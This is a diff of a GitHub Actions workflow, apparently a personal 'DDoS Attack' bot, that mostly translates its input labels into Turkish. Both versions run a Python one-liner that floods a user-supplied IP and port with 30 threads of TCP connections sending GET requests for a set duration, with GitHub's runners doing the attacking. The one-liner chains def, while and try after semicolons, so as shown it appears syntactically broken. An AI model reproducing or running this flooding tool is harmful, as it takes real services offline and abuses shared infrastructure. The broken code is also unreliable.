@@ -1,24 +1,23 @@
-name: DDoS Attack Bot
+name: "DDoS Attack"
 on:
   workflow_dispatch:
     inputs:
-      target:
-        description: 'Target IP'
+      ip:
+        description: "Hedef IP"
         required: true
-        default: '1.1.1.1'
+        default: "1.1.1.1"
       port:
-        description: 'Target Port'
+        description: "Hedef Port"
         required: true
-        default: '80'
+        default: "80"
       duration:
-        description: 'Duration (seconds)'
+        description: "Süre (saniye)"
         required: true
-        default: '30'
+        default: "30"
 
 jobs:
   attack:
     runs-on: ubuntu-latest
     steps:
-      - name: Run Attack
-        run: |
-          python3 -c "import socket,threading,time;t='${{ github.event.inputs.target }}';p=${{ github.event.inputs.port }};d=${{ github.event.inputs.duration }};print('Target:',t,p,'Duration:',d);c=0;def a():global c;e=time.time()+d;while time.time()<e:try:s=socket.socket();s.settimeout(1);s.connect((t,p));s.send(b'GET / HTTP/1.1\\r\\n\\r\\n');s.close();c+=1;except:pass;ts=[threading.Thread(target=a)for _ in range(30)];for th in ts:th.start();for th in ts:th.join();print('Requests:',c)"
+      - name: "Saldırıyı Başlat"
+        run: "python3 -c \"import socket,threading,time;target='${{ github.event.inputs.ip }}';port=${{ github.event.inputs.port }};duration=${{ github.event.inputs.duration }};print('Hedef:',target,port);print('Süre:',duration,'saniye');count=0;def a():global count;end=time.time()+int(duration);while time.time()<end:try:s=socket.socket();s.settimeout(1);s.connect((target,int(port)));s.send(b'GET /');s.close();count+=1;except:pass;t=[threading.Thread(target=a) for _ in range(30)];[x.start() for x in t];[x.join() for x in t];print('Bitti. İstek:',count)\""
